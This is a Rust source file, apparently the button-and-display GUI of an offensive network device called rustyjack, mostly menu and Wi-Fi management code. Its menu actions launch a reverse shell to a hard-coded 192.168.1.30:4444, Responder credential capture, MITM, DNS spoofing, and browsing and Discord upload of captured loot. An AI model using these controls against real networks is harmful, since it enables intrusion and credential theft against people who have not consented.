use std::{
    fs,
    io::Write,
    path::{Path, PathBuf},
    process::Command,
    thread,
    time::Duration,
};

use anyhow::{Result, anyhow, bail};
use rustyjack_core::cli::{
    AutopilotCommand, AutopilotMode as CoreAutopilotMode, AutopilotStartArgs,
    BridgeCommand, BridgeStartArgs, BridgeStopArgs, Commands, DiscordCommand, DiscordSendArgs,
    DnsSpoofCommand, DnsSpoofStartArgs, HardwareCommand, LootCommand, LootKind, LootListArgs, 
    LootReadArgs, MitmCommand, MitmStartArgs, NotifyCommand, ResponderArgs, ResponderCommand, 
    ReverseCommand, ReverseLaunchArgs, ScanRunArgs, StatusCommand, SystemUpdateArgs,
    WifiBestArgs, WifiCommand, WifiProfileCommand, WifiProfileConnectArgs, WifiProfileDeleteArgs,
    WifiRouteCommand, WifiRouteEnsureArgs, WifiScanArgs, WifiStatusArgs, WifiSwitchArgs,
};
use serde::Deserialize;
use serde_json::{self, Value};
use tempfile::{NamedTempFile, TempPath};
use walkdir::WalkDir;
use zip::{CompressionMethod, ZipWriter, write::FileOptions};

use crate::{
    config::GuiConfig,
    core::CoreBridge,
    display::{Display, DashboardView},
    input::{Button, ButtonPad},
    menu::{AutopilotMode, ColorTarget, LootSection, MenuAction, MenuEntry, MenuTree, ScanProfile, menu_title},
    stats::StatsSampler,
};

pub struct App {
    core: CoreBridge,
    display: Display,
    buttons: ButtonPad,
    config: GuiConfig,
    menu: MenuTree,
    menu_state: MenuState,
    stats: StatsSampler,
    root: PathBuf,
    spoof_site: String,
    bridge_pair: Option<(String, String)>,
    dashboard_view: Option<DashboardView>,
}

enum WifiMenuChoice {
    ScanNetworks,
    SavedProfiles,
    QuickToggle,
    InterfaceConfig,
    StatusInfo,
    RouteControl,
    Exit,
}

enum WifiRouteChoice {
    Snapshot,
    ForceWifi,
    ForceEthernet,
    Backup,
    Restore,
    Exit,
}

#[derive(Debug, Clone, Deserialize)]
struct WifiScanResponse {
    interface: String,
    #[serde(default)]
    networks: Vec<WifiNetworkEntry>,
}

#[derive(Debug, Clone, Deserialize)]
struct WifiNetworkEntry {
    #[serde(default)]
    ssid: Option<String>,
    #[serde(default)]
    bssid: Option<String>,
    #[serde(default)]
    signal_dbm: Option<i32>,
    #[serde(default)]
    channel: Option<u8>,
    #[serde(default)]
    encrypted: bool,
}

#[derive(Debug, Clone, Deserialize)]
struct WifiProfilesResponse {
    profiles: Vec<WifiProfileSummary>,
}

#[derive(Debug, Clone, Deserialize)]
struct WifiProfileSummary {
    ssid: String,
    interface: String,
    priority: i32,
}

#[derive(Debug, Clone, Deserialize)]
struct WifiListResponse {
    interfaces: Vec<InterfaceSummary>,
}

#[derive(Debug, Clone, Deserialize)]
struct InterfaceSummary {
    name: String,
    kind: String,
    #[serde(default)]
    oper_state: String,
    #[serde(default)]
    ip: Option<String>,
}

#[derive(Debug, Clone, Deserialize, Default)]
struct RouteSnapshot {
    #[serde(default)]
    default_route: Option<RouteInfo>,
    #[serde(default)]
    interfaces: Vec<InterfaceSummary>,
    #[serde(default)]
    dns_servers: Vec<String>,
}

#[derive(Debug, Clone, Deserialize, Default)]
struct RouteInfo {
    #[serde(default)]
    interface: Option<String>,
    #[serde(default)]
    gateway: Option<String>,
}

#[derive(Debug, Clone, Deserialize, Default)]
struct WifiStatusOverview {
    interface: String,
    #[serde(default)]
    address: Option<String>,
    #[serde(default)]
    gateway: Option<String>,
    #[serde(default)]
    connected: Option<bool>,
    #[serde(default)]
    ssid: Option<String>,
}

fn format_network_label(net: &WifiNetworkEntry) -> String {
    let ssid = net.ssid.as_deref().unwrap_or("<hidden>");
    let signal = net
        .signal_dbm
        .map(|s| format!("{s} dBm"))
        .unwrap_or_else(|| "".to_string());
    let lock = if net.encrypted { "[E]" } else { "[ ]" };
    if signal.is_empty() {
        return format!("{lock} {ssid}");
    }
    format!("{lock} {ssid} {signal}")
}

// Map low-level Button values to higher-level ButtonAction values
impl App {
    fn map_button(&self, b: Button) -> ButtonAction {
        match b {
            Button::Up => ButtonAction::Up,
            Button::Down => ButtonAction::Down,
            Button::Left => ButtonAction::Back,
            Button::Right | Button::Select => ButtonAction::Select,
            Button::Key1 => ButtonAction::Refresh,
            Button::Key2 => ButtonAction::MainMenu,
            Button::Key3 => ButtonAction::Reboot,
        }
    }

    fn confirm_reboot(&mut self) -> Result<()> {
        // Ask the user to confirm reboot — waits for explicit confirmation
        let overlay = self.stats.snapshot();
        let content = vec![
            "Confirm reboot".to_string(),
            "SELECT = Reboot".to_string(),
            "LEFT = Cancel".to_string(),
        ];

        self.display.draw_dialog(&content, &overlay)?;

        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select => {
                    // Run reboot command and then exit
                    let _ = Command::new("systemctl").arg("reboot").status();
                    // If the command succeeded the system will reboot; exit the app regardless.
                    std::process::exit(0);
                }
                ButtonAction::Back | ButtonAction::MainMenu => {
                    // Cancel and return
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog
                    self.display.draw_dialog(&content, &overlay)?;
                }
                _ => {}
            }
        }
        Ok(())
    }
}

struct MenuState {
    stack: Vec<String>,
    selection: usize,
    // Scroll offset for current menu view — ensures selection stays visible
    offset: usize,
}

impl MenuState {
    fn new() -> Self {
        Self {
            stack: vec!["a".to_string()],
            selection: 0,
            offset: 0,
        }
    }

    fn current_id(&self) -> &str {
        self.stack.last().map(|s| s.as_str()).unwrap_or("a")
    }

    fn enter(&mut self, id: &str) {
        self.stack.push(id.to_string());
        self.selection = 0;
        self.offset = 0;
    }

    fn back(&mut self) {
        if self.stack.len() > 1 {
            self.stack.pop();
            self.selection = 0;
            self.offset = 0;
        }
    }

    fn move_up(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        if self.selection == 0 {
            self.selection = total - 1;
        } else {
            self.selection -= 1;
        }
        // Ensure selection is inside visible window
        const VISIBLE: usize = 7;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn move_down(&mut self, total: usize) {
        if total == 0 {
            self.selection = 0;
            return;
        }
        self.selection = (self.selection + 1) % total;
        // Ensure selection is inside visible window
        const VISIBLE: usize = 7;
        if self.selection < self.offset {
            self.offset = self.selection;
        } else if self.selection >= self.offset + VISIBLE {
            self.offset = self.selection.saturating_sub(VISIBLE - 1);
        }
    }

    fn home(&mut self) {
        self.stack = vec!["a".to_string()];
        self.selection = 0;
        self.offset = 0;
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ButtonAction {
    Up,
    Down,
    Back,
    Select,
    Refresh,
    MainMenu,
    Reboot,
}

impl App {
    pub fn new() -> Result<Self> {
        let core = CoreBridge::with_root(None)?;
        let root = core.root().to_path_buf();
        let config = GuiConfig::load(&root)?;
        let mut display = Display::new(&config.colors)?;
        let buttons = ButtonPad::new(&config.pins)?;
        
        // Show splash screen during initialization
        let splash_path = root.join("img").join("rustyjack.png");
        let _ = display.show_splash_screen(&splash_path);
        
        // Let splash show while stats sampler starts up
        let stats = StatsSampler::spawn(core.clone());
        
        // Give splash screen time to be visible (1.5 seconds)
        thread::sleep(Duration::from_millis(1500));

        Ok(Self {
            core,
            display,
            buttons,
            config,
            menu: MenuTree::new(),
            menu_state: MenuState::new(),
            stats,
            root,
            spoof_site: "wordpress".to_string(),
            bridge_pair: None,
            dashboard_view: None,
        })
    }

    pub fn run(mut self) -> Result<()> {
        loop {
            if let Some(view) = self.dashboard_view {
                // Dashboard mode
                let status = self.stats.snapshot();
                self.display.draw_dashboard(view, &status)?;
                
                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Back => {
                        // Exit dashboard, return to menu
                        self.dashboard_view = None;
                    }
                    ButtonAction::Select => {
                        // Cycle to next dashboard
                        self.dashboard_view = Some(match view {
                            DashboardView::SystemHealth => DashboardView::AttackMetrics,
                            DashboardView::AttackMetrics => DashboardView::LootSummary,
                            DashboardView::LootSummary => DashboardView::NetworkTraffic,
                            DashboardView::NetworkTraffic => DashboardView::SystemHealth,
                        });
                    }
                    ButtonAction::Refresh => {
                        // force redraw; nothing else required (loop will redraw)
                    }
                    ButtonAction::MainMenu => {
                        self.menu_state.home();
                    }
                    ButtonAction::Reboot => {
                        self.confirm_reboot()?;
                    }
                    _ => {}
                }
            } else {
                // Menu mode
                let entries = self.render_menu()?;
                let button = self.buttons.wait_for_press()?;
                match self.map_button(button) {
                    ButtonAction::Up => self.menu_state.move_up(entries.len()),
                    ButtonAction::Down => self.menu_state.move_down(entries.len()),
                    ButtonAction::Back => self.menu_state.back(),
                    ButtonAction::Select => {
                        if let Some(entry) = entries.get(self.menu_state.selection) {
                            let action = entry.action.clone();
                            self.execute_action(action)?;
                        }
                    }
                    ButtonAction::Refresh => {
                        // Force refresh — nothing required here because the loop redraws
                    }
                    ButtonAction::MainMenu => self.menu_state.home(),
                    ButtonAction::Reboot => self.confirm_reboot()?,
                    _ => {}
                }
            }
        }
    }

    fn render_menu(&mut self) -> Result<Vec<MenuEntry>> {
        let mut entries = self.menu.entries(self.menu_state.current_id())?;
        
        // Dynamic label updates
        for entry in &mut entries {
            if let MenuAction::ToggleDiscord = entry.action {
                let state = if self.config.settings.discord_enabled { "ON" } else { "OFF" };
                entry.label = format!(" Discord Webhook [{}]", state);
            }
        }

        if entries.is_empty() {
            entries.push(MenuEntry {
                label: " Nothing here".to_string(),
                action: MenuAction::ShowInfo,
            });
        }
        if self.menu_state.selection >= entries.len() {
            self.menu_state.selection = entries.len().saturating_sub(1);
        }
        let status = self.stats.snapshot();
        // When there are more entries than fit on-screen, show a sliding window
        // so the selected item is always visible. MenuState::offset tracks the
        // first item index in the current view.
        const VISIBLE: usize = 7;
        let total = entries.len();
        if self.menu_state.selection >= total && total > 0 {
            self.menu_state.selection = total - 1;
        }
        // clamp offset
        if self.menu_state.offset >= total {
            self.menu_state.offset = 0;
        }

        let start = self.menu_state.offset.min(total);
        let _end = (start + VISIBLE).min(total);

        let labels: Vec<String> = entries
            .iter()
            .skip(start)
            .take(VISIBLE)
            .map(|entry| entry.label.clone())
            .collect();

        // selected index relative to the slice
        let displayed_selected = if total == 0 { 0 } else { self.menu_state.selection.saturating_sub(start) };

        self.display.draw_menu(
            menu_title(self.menu_state.current_id()),
            &labels,
            displayed_selected,
            &status,
        )?;
        Ok(entries)
    }

    fn execute_action(&mut self, action: MenuAction) -> Result<()> {
        match action {
            MenuAction::Submenu(id) => self.menu_state.enter(id),
            MenuAction::Scan(profile) => self.run_scan(profile)?,
            MenuAction::ReverseDefault => self.launch_default_reverse()?,
            MenuAction::ReverseCustom => self.launch_remote_reverse("192.168.1.30")?,
            MenuAction::ResponderOn => self.responder_on()?,
            MenuAction::ResponderOff => self.responder_off()?,
            MenuAction::MitmStart => self.mitm_start()?,
            MenuAction::MitmStop => {
                self.simple_command(Commands::Mitm(MitmCommand::Stop), "MITM stopped")?
            }
            MenuAction::DnsStart => self.dns_start()?,
            MenuAction::DnsStop => self.simple_command(
                Commands::DnsSpoof(DnsSpoofCommand::Stop),
                "DNS spoof stopped",
            )?,
            MenuAction::SpoofSite(site) => self.set_spoof_site(site),
            MenuAction::ShowInfo => self.show_network_info()?,
            MenuAction::RefreshConfig => self.reload_config()?,
            MenuAction::SaveConfig => self.save_config()?,
            MenuAction::SetColor(target) => self.pick_color(target)?,
            MenuAction::RestartSystem => self.restart_system()?,
            MenuAction::Loot(section) => self.show_loot(section)?,
            MenuAction::QuickWifiToggle => self.quick_wifi_toggle()?,
            MenuAction::SwitchInterfaceMenu => self.switch_interface_menu()?,
            MenuAction::ShowInterfaceInfo => self.show_interface_info()?,
            MenuAction::ShowNetworkHealth => self.show_network_health()?,
            MenuAction::ShowRoutingStatus => self.show_routing_status()?,
            MenuAction::SwitchToWifi => self.switch_to_wifi()?,
            MenuAction::SwitchToEthernet => self.switch_to_ethernet()?,
            MenuAction::WifiManager => self.launch_wifi_manager()?,
            MenuAction::WifiScan => { self.show_wifi_scan_menu()?; }
            MenuAction::BridgeStart => self.start_bridge()?,
            MenuAction::BridgeStop => self.stop_bridge()?,
            MenuAction::DiscordUpload => self.discord_upload()?,
            MenuAction::SystemUpdate => self.run_system_update()?,
            MenuAction::ViewDashboards => {
                self.dashboard_view = Some(DashboardView::SystemHealth);
            }
            MenuAction::AutopilotStart(mode) => self.autopilot_start(mode)?,
            MenuAction::AutopilotStop => self.autopilot_stop()?,
            MenuAction::AutopilotStatus => self.autopilot_status()?,
            MenuAction::ToggleDiscord => self.toggle_discord()?,
            MenuAction::TransferToUSB => self.transfer_to_usb()?,
            MenuAction::HardwareDetect => self.show_hardware_detect()?,
        }
        Ok(())
    }

    fn run_scan(&mut self, profile: &ScanProfile) -> Result<()> {
        self.show_message("Nmap", ["Launching scan...", profile.label, "Please wait"])?;
        let args = ScanRunArgs {
            label: profile.label.to_string(),
            nmap_args: profile.args.iter().map(|arg| arg.to_string()).collect(),
            interface: None,
            target: None,
            output_path: None,
            no_discord: !self.config.settings.discord_enabled,
        };

        let core = self.core.clone();
        let display = &mut self.display;
        let stats = &self.stats;
        let label = profile.label.clone();

        let (_, data) = core.run_scan_with_progress(args, |pct, task| {
             let status = stats.snapshot();
             let _ = display.draw_progress_dialog(
                 &format!("Scanning: {}", label),
                 task,
                 pct,
                 &status
             );
        })?;

        let interface = data
            .get("interface")
            .and_then(Value::as_str)
            .unwrap_or("unknown");
        let target = data.get("target").and_then(Value::as_str).unwrap_or("");
        let mut lines = vec![profile.label.to_string(), format!("Interface: {interface}")];
        if !target.is_empty() {
            lines.push(format!("Target: {target}"));
        }
        self.show_message("Scan complete", lines)
    }

    fn launch_default_reverse(&mut self) -> Result<()> {
        let best_args = WifiBestArgs { prefer_wifi: false };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Best(best_args)))?;
        let interface = data
            .get("interface")
            .and_then(Value::as_str)
            .unwrap_or("eth0")
            .to_string();

        let status_args = WifiStatusArgs {
            interface: Some(interface.clone()),
        };
        let (_, status) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Status(status_args)))?;
        let address = status
            .get("address")
            .and_then(Value::as_str)
            .ok_or_else(|| anyhow!("No IPv4 address on interface {interface}"))?;
        let parts: Vec<&str> = address.split('.').collect();
        if parts.len() < 4 {
            bail!("Unexpected IP format: {address}");
        }
        let prefix = parts[..3].join(".");
        if let Some(octet) = self.prompt_octet(&prefix)? {
            let target = format!("{prefix}.{octet}");
            self.launch_reverse(&target, &interface)
        } else {
            self.show_message("Reverse shell", ["Cancelled"])?;
            Ok(())
        }
    }

    fn launch_remote_reverse(&mut self, target: &str) -> Result<()> {
        self.launch_reverse(target, "eth0")
    }

    fn launch_reverse(&mut self, target: &str, interface: &str) -> Result<()> {
        let command = Commands::Reverse(ReverseCommand::Launch(ReverseLaunchArgs {
            target: target.to_string(),
            port: 4444,
            shell: "/bin/bash".into(),
            interface: Some(interface.to_string()),
        }));
        self.simple_command(command, "Reverse shell launched")
    }

    fn responder_on(&mut self) -> Result<()> {
        let command = Commands::Responder(ResponderCommand::On(ResponderArgs { interface: None }));
        self.simple_command(command, "Responder started")
    }

    fn responder_off(&mut self) -> Result<()> {
        self.simple_command(
            Commands::Responder(ResponderCommand::Off),
            "Responder stopped",
        )
    }

    fn mitm_start(&mut self) -> Result<()> {
        let args = MitmStartArgs {
            interface: None,
            network: None,
        };
        self.simple_command(Commands::Mitm(MitmCommand::Start(args)), "MITM launched")
    }

    fn dns_start(&mut self) -> Result<()> {
        let args = DnsSpoofStartArgs {
            site: self.spoof_site.clone(),
            interface: None,
        };
        self.simple_command(
            Commands::DnsSpoof(DnsSpoofCommand::Start(args)),
            "DNS spoof started",
        )
    }

    fn set_spoof_site(&mut self, site: &str) {
        self.spoof_site = site.to_string();
    }

    fn simple_command(&mut self, command: Commands, success: &str) -> Result<()> {
        if let Err(err) = self.core.dispatch(command) {
            self.show_message("Error", [format!("{err}")])?;
        } else {
            self.show_message("Success", [success.to_string()])?;
        }
        Ok(())
    }

    fn show_message<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();
        // Draw the dialog and require an explicit button press to dismiss
        self.display.draw_dialog(&content, &overlay)?;
        loop {
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Select | ButtonAction::Back => break,
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    break;
                }
                ButtonAction::Refresh => {
                    // redraw the dialog so user can refresh view content if desired
                    self.display.draw_dialog(&content, &overlay)?;
                }
                ButtonAction::Reboot => {
                    // confirm and perform reboot if accepted
                    self.confirm_reboot()?;
                    break;
                }
                _ => {}
            }
        }
        Ok(())
    }
    
    fn show_progress<I, S>(&mut self, title: &str, lines: I) -> Result<()>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let overlay = self.stats.snapshot();
        let content: Vec<String> = std::iter::once(title.to_string())
            .chain(lines.into_iter().map(|line| line.as_ref().to_string()))
            .collect();
        self.display.draw_dialog(&content, &overlay)?;
        Ok(())
    }
    
    fn execute_with_progress<F, T>(&mut self, title: &str, message: &str, operation: F) -> Result<T>
    where
        F: FnOnce() -> Result<T>,
    {
        self.show_progress(title, [message, "Please wait..."])?;
        let result = operation();
        result
    }

    fn reload_config(&mut self) -> Result<()> {
        self.config = GuiConfig::load(&self.root)?;
        self.display.update_palette(&self.config.colors);
        self.show_message("Config", ["Reloaded"])
    }

    fn save_config(&mut self) -> Result<()> {
        self.config.save(&self.root.join("gui_conf.json"))?;
        self.show_message("Config", ["Saved"])
    }

    fn pick_color(&mut self, target: ColorTarget) -> Result<()> {
        let choices = [
            ("White", "#ffffff"),
            ("Green", "#05ff00"),
            ("Red", "#ff0000"),
            ("Blue", "#2d0fff"),
            ("Navy", "#141494"),
        ];
        let mut index = 0;
        loop {
            let overlay = self.stats.snapshot();
            let (name, hex) = choices[index];
            let label = format!("{:?}: {}", target, name);
            self.display.draw_dialog(&[label.clone()], &overlay)?;
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Back => index = (index + choices.len() - 1) % choices.len(),
                ButtonAction::Select => {
                    self.apply_color(target.clone(), hex);
                    self.display
                        .draw_dialog(&["Color updated".into()], &overlay)?;
                    thread::sleep(Duration::from_millis(600));
                    break;
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
                _ => {}
            }
        }
        Ok(())
    }

    fn apply_color(&mut self, target: ColorTarget, value: &str) {
        match target {
            ColorTarget::Background => self.config.colors.background = value.to_string(),
            ColorTarget::Border => self.config.colors.border = value.to_string(),
            ColorTarget::Text => self.config.colors.text = value.to_string(),
            ColorTarget::SelectedText => self.config.colors.selected_text = value.to_string(),
            ColorTarget::SelectedBackground => {
                self.config.colors.selected_background = value.to_string()
            }
        }
        self.display.update_palette(&self.config.colors);
    }

    fn show_network_info(&mut self) -> Result<()> {
        let (_, data) = self
            .core
            .dispatch(Commands::Status(StatusCommand::Network))?;
        let mut lines = vec!["Interface".to_string()];
        if let Some(iface) = data.get("interface").and_then(Value::as_str) {
            lines.push(format!("  {iface}"));
        }
        if let Some(addr) = data.get("address").and_then(Value::as_str) {
            lines.push(format!("IP: {addr}"));
        }
        if let Some(gateway) = data.get("gateway").and_then(Value::as_str) {
            lines.push(format!("GW: {gateway}"));
        }
        self.show_message("Network", lines.iter().map(|s| s.as_str()))
    }

    fn show_loot(&mut self, section: LootSection) -> Result<()> {
        let kind = match section {
            LootSection::Nmap => LootKind::Nmap,
            LootSection::Responder => LootKind::Responder,
            LootSection::DnsSpoof => LootKind::Dnsspoof,
        };
        let (_, data) = self
            .core
            .dispatch(Commands::Loot(LootCommand::List(LootListArgs { kind })))?;
        let files = data
            .get("files")
            .and_then(Value::as_array)
            .cloned()
            .unwrap_or_default();
        if files.is_empty() {
            return self.show_message("Loot", ["No files"]);
        }
        let mut paths = Vec::new();
        let mut labels = Vec::new();
        for entry in &files {
            if let Some(path) = entry.get("path").and_then(Value::as_str) {
                let display = Path::new(path)
                    .file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or(path)
                    .to_string();
                paths.push(path.to_string());
                labels.push(display);
            }
        }
        
        // Interactive file browser - keeps looping until user backs out
        loop {
            let Some(index) = self.choose_from_list("Loot files", &labels)? else {
                return Ok(());
            };
            let path = paths
                .get(index)
                .cloned()
                .unwrap_or_else(|| paths.first().cloned().unwrap());
            
            // Open the selected file in scrollable viewer
            self.view_loot_file(&path)?;
        }
    }
    
    fn view_loot_file(&mut self, path: &str) -> Result<()> {
        // Read the file with a high line limit
        let read_args = LootReadArgs {
            path: PathBuf::from(path),
            max_lines: 5000,
        };
        let (_, data) = self
            .core
            .dispatch(Commands::Loot(LootCommand::Read(read_args)))?;
        
        let lines = data
            .get("lines")
            .and_then(Value::as_array)
            .map(|arr| {
                arr.iter()
                    .filter_map(Value::as_str)
                    .map(|s| s.to_string())
                    .collect::<Vec<_>>()
            })
            .unwrap_or_default();
        
        let truncated = data
            .get("truncated")
            .and_then(Value::as_bool)
            .unwrap_or(false);
        
        if lines.is_empty() {
            return self.show_message("Loot", ["File is empty"]);
        }
        
        let filename = Path::new(path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("file")
            .to_string();
        
        // Scrollable file viewer
        self.scrollable_text_viewer(&filename, &lines, truncated)
    }
    
    fn scrollable_text_viewer(&mut self, title: &str, lines: &[String], truncated: bool) -> Result<()> {
        const LINES_PER_PAGE: usize = 5;
        let total_lines = lines.len();
        let mut offset = 0;
        
        loop {
            let overlay = self.stats.snapshot();
            let end = (offset + LINES_PER_PAGE).min(total_lines);
            let visible_lines: Vec<String> = lines[offset..end].to_vec();
            
            // Build display content with navigation hints
            let mut content = vec![
                format!("{} ({}/{})", title, offset + 1, total_lines),
            ];
            content.extend(visible_lines);
            
            // Add navigation hint
            if offset + LINES_PER_PAGE < total_lines {
                content.push("↓ More below ↓".to_string());
            } else if truncated {
                content.push("[File truncated]".to_string());
            }
            
            self.display.draw_dialog(&content, &overlay)?;
            
            let button = self.buttons.wait_for_press()?;
            match self.map_button(button) {
                ButtonAction::Down => {
                    // Scroll down by one line
                    if offset + LINES_PER_PAGE < total_lines {
                        offset += 1;
                    }
                }
                ButtonAction::Up => {
                    // Scroll up by one line
                    if offset > 0 {
                        offset = offset.saturating_sub(1);
                    }
                }
                ButtonAction::Select => {
                    // Page down
                    if offset + LINES_PER_PAGE < total_lines {
                        offset = (offset + LINES_PER_PAGE).min(total_lines.saturating_sub(LINES_PER_PAGE));
                    }
                }
                ButtonAction::Back => {
                    // Exit viewer and return to file list
                    return Ok(());
                }
                ButtonAction::MainMenu => {
                    self.menu_state.home();
                    return Ok(());
                }
                ButtonAction::Refresh => {
                    // Redraw current page
                }
                ButtonAction::Reboot => {
                    self.confirm_reboot()?;
                }
            }
        }
    }

    fn quick_wifi_toggle(&mut self) -> Result<()> {
        let best = WifiBestArgs { prefer_wifi: false };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Best(best)))?;
        let current = data
            .get("interface")
            .and_then(Value::as_str)
            .unwrap_or("eth0");
        let target = if current == "wlan0" { "wlan1" } else { "wlan0" };
        let args = WifiSwitchArgs {
            interface: target.to_string(),
        };
        self.simple_command(
            Commands::Wifi(WifiCommand::Switch(args)),
            "Interface switched",
        )
    }

    fn switch_interface_menu(&mut self) -> Result<()> {
        let (_, data) = self.core.dispatch(Commands::Wifi(WifiCommand::List))?;
        let interfaces = data
            .get("interfaces")
            .and_then(Value::as_array)
            .cloned()
            .unwrap_or_default();
        if interfaces.is_empty() {
            return self.show_message("Interfaces", ["None detected"]);
        }
        let mut names = Vec::new();
        let mut labels = Vec::new();
        for entry in &interfaces {
            if let Some(name) = entry.get("name").and_then(Value::as_str) {
                let ip = entry.get("ip").and_then(Value::as_str).unwrap_or("-");
                labels.push(format!("{name} ({ip})"));
                names.push(name.to_string());
            }
        }
        let Some(index) = self.choose_from_list("Interfaces", &labels)? else {
            return Ok(());
        };
        let target = names
            .get(index)
            .cloned()
            .unwrap_or_else(|| "eth0".to_string());
        let args = WifiSwitchArgs { interface: target };
        self.simple_command(
            Commands::Wifi(WifiCommand::Switch(args)),
            "Interface switched",
        )
    }

    fn show_interface_info(&mut self) -> Result<()> {
        let args = WifiStatusArgs { interface: None };
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Status(args)))?;
        let lines = vec![
            format!(
                "Interface: {}",
                data.get("interface")
                    .and_then(Value::as_str)
                    .unwrap_or("n/a")
            ),
            format!(
                "IP: {}",
                data.get("address").and_then(Value::as_str).unwrap_or("n/a")
            ),
            format!(
                "Gateway: {}",
                data.get("gateway").and_then(Value::as_str).unwrap_or("n/a")
            ),
        ];
        self.show_message("Interface", lines.iter().map(|s| s.as_str()))
    }

    fn show_network_health(&mut self) -> Result<()> {
        let (_, data) = self
            .core
            .dispatch(Commands::Status(StatusCommand::Network))?;
        let mut lines = Vec::new();
        if let Some(addr) = data.get("address").and_then(Value::as_str) {
            lines.push(format!("IP: {addr}"));
        }
        let gw_status = if data
            .get("gateway_reachable")
            .and_then(Value::as_bool)
            .unwrap_or(false)
        {
            "Gateway OK"
        } else {
            "Gateway down"
        };
        lines.push(gw_status.to_string());
        self.show_message("Network health", lines.iter().map(|s| s.as_str()))
    }

    fn show_routing_status(&mut self) -> Result<()> {
        let (_, data) = self
            .core
            .dispatch(Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Status)))?;
        let mut lines = Vec::new();
        if let Some(iface) = data.get("default_interface").and_then(Value::as_str) {
            lines.push(format!("Default: {iface}"));
        }
        if let Some(gw) = data.get("gateway").and_then(Value::as_str) {
            lines.push(format!("Gateway: {gw}"));
        }
        self.show_message("Routing", lines.iter().map(|s| s.as_str()))
    }

    fn switch_to_wifi(&mut self) -> Result<()> {
        self.simple_command(
            Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Ensure(
                WifiRouteEnsureArgs {
                    interface: "wlan0".into(),
                },
            ))),
            "Switched to WiFi",
        )
    }

    fn switch_to_ethernet(&mut self) -> Result<()> {
        self.simple_command(
            Commands::Wifi(WifiCommand::Route(WifiRouteCommand::Ensure(
                WifiRouteEnsureArgs {
                    interface: "eth0".into(),
                },
            ))),
            "Switched to Ethernet",
        )
    }

    fn launch_wifi_manager(&mut self) -> Result<()> {
        use WifiMenuChoice::*;
        let actions = vec![
            ("Scan networks", ScanNetworks),
            ("Saved profiles", SavedProfiles),
            ("Quick toggle 0↔1", QuickToggle),
            ("Interface config", InterfaceConfig),
            ("Status & info", StatusInfo),
            ("Route control", RouteControl),
            ("Exit Wi-Fi manager", Exit),
        ];

        loop {
            let labels: Vec<String> = actions
                .iter()
                .map(|(label, _)| format!(" {label}"))
                .collect();
            let selection = self.choose_from_list("Wi-Fi Manager", &labels)?;
            let Some(index) = selection else {
                break;
            };
            match actions[index].1 {
                ScanNetworks => self.show_wifi_scan_menu()?,
                SavedProfiles => self.show_wifi_profiles_menu()?,
                QuickToggle => {
                    self.quick_wifi_toggle()?;
                }
                InterfaceConfig => self.show_wifi_interface_menu()?,
                StatusInfo => self.show_wifi_status_view()?,
                RouteControl => self.show_wifi_route_menu()?,
                Exit => break,
            }
        }
        Ok(())
    }

    fn show_wifi_scan_menu(&mut self) -> Result<()> {
        loop {
            self.show_progress("Wi-Fi Scan", ["Scanning networks...", "Please wait"])?;
            
            let scan = match self.fetch_wifi_scan() {
                Ok(s) => s,
                Err(e) => {
                    self.show_message("Scan Error", [format!("{e}")])?;
                    return Ok(());
                }
            };
            
            if scan.networks.is_empty() {
                self.show_message("Wi-Fi", ["No networks detected"])?;
                return Ok(());
            }
            
            let mut labels: Vec<String> = scan.networks.iter().map(format_network_label).collect();
            labels.push("Rescan networks".to_string());
            let title = format!("Networks ({}) [{}]", scan.networks.len(), scan.interface);
            let Some(index) = self.choose_from_list(&title, &labels)? else {
                break;
            };
            if index == scan.networks.len() {
                continue;
            }
            self.handle_network_selection(&scan.networks[index])?;
        }
        Ok(())
    }

    fn show_wifi_profiles_menu(&mut self) -> Result<()> {
        loop {
            let profiles = self.fetch_wifi_profiles()?;
            if profiles.is_empty() {
                self.show_message("Wi-Fi", ["No saved profiles"])?;
                return Ok(());
            }
            let mut labels: Vec<String> = profiles
                .iter()
                .map(|profile| {
                    format!(
                        "{} [{}] prio {}",
                        profile.ssid, profile.interface, profile.priority
                    )
                })
                .collect();
            labels.push("Refresh profiles".to_string());
            let Some(index) = self.choose_from_list("Saved profiles", &labels)? else {
                break;
            };
            if index == profiles.len() {
                continue;
            }
            self.handle_profile_selection(&profiles[index])?;
        }
        Ok(())
    }

    fn show_wifi_interface_menu(&mut self) -> Result<()> {
        loop {
            let interfaces = self.fetch_wifi_interfaces()?;
            if interfaces.is_empty() {
                self.show_message("Wi-Fi", ["No interfaces detected"])?;
                return Ok(());
            }
            let mut labels: Vec<String> = interfaces
                .iter()
                .map(|iface| {
                    let ip = iface.ip.as_deref().unwrap_or("no ip");
                    format!("{} ({}) {ip}", iface.name, iface.kind)
                })
                .collect();
            labels.push("Refresh list".to_string());
            let Some(index) = self.choose_from_list("Interface config", &labels)? else {
                break;
            };
            if index == interfaces.len() {
                continue;
            }
            let target = interfaces[index].name.clone();
            let args = WifiSwitchArgs { interface: target };
            self.simple_command(
                Commands::Wifi(WifiCommand::Switch(args)),
                "Interface preference saved",
            )?;
        }
        Ok(())
    }

